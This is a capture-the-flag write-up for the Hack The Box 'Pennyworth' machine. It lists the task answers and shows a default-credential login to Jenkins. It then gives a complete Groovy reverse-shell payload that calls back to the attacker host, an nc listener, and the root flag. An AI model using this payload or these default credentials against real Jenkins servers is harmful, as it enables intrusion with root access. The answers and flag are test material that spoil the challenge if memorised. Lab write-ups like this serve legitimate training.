# Pennyworth
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Pennyworth
* Topic: [[Java]] [[CVE]]
* Difficulty: Very easy
* Date: 17-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What does the acronym CVE stand for? 
- **Common Vulnerabilities and Exposures**
2. What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for? 
 - **confidentiality, integrity, availability**
3. What is the version of the service running on port 8080? 
- **Jetty 9.4.39.v20210325**
4. What version of Jenkins is running on the target? 
- **2.289.1**
5. What type of script is accepted as input on the Jenkins Script Console? 
- **groovy**
6. What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows? 
- **cmd.exe**
7. What is a different command than "ip a" we could use to display our network interfaces' information on Linux? 
- **ifconfig**
8. What switch should we use with netcat for it to use UDP transport mode? 
- **-u**
9. What is the term used to describe making a target host initiate a connection back to the attacker host? 
- **reverse shell**

---
## Flag:
nmap:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.111.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-16 18:07 EDT
Nmap scan report for 10.129.111.154
Host is up (0.078s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/

Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
```

We have Jetty running on port 8080. Also, nmap found an entry in /robots.txt.

If we open the page, we see a login page.

![](Pasted%20image%2020220417133302.png)

The robots.txt file is simply telling search engines not to index the site.

![](Pasted%20image%2020220417133502.png)

We can try some default credentials. 

User:pass `root:password`

![](Pasted%20image%2020220417141023.png)

We are in.

Looking around, we find a Script console under the Manage Jenkins tab. It interprets Groovy scripts.

All we have to do now is make a Groovy script that can execute a reverse shell on the server, meaning that the server will try to initiate a shell connection back to us.

![](Pasted%20image%2020220417144615.png)

Searching for a payload, we find [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) cheat sheet detailing a reverse shell for Groovy. 

```
String host="10.10.14.15";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

We can add

```
Thread.start {
    // Reverse shell here
}
```

To make the reverse shell more stealthy on the target

Before we can execute the payload we need to connect we need to run a netcat listener on port 4444.

Command:

`nc -lvnp 4444`

`l`: Listening mode

`v`: Verbose mode

`p`: Specify port, in this case 4444.

`n`: No DNS. Numeric IP only.

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
```

Now we can execute the payload.

It worked, netcat received a connection from the host. We are now logged in as root.

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.90.88] 44516
whoami
root
```

![](Pasted%20image%2020220417152724.png)

Looking around:

```console
#cd /root
#ls
flag.txt
snap
#cat flag.txt
9cdfb439c7876e703e307864c9167a15
```

We got the final flag.

**Flag:** `9cdfb439c7876e703e307864c9167a15`

---
**Tags:** [[HackTheBox]]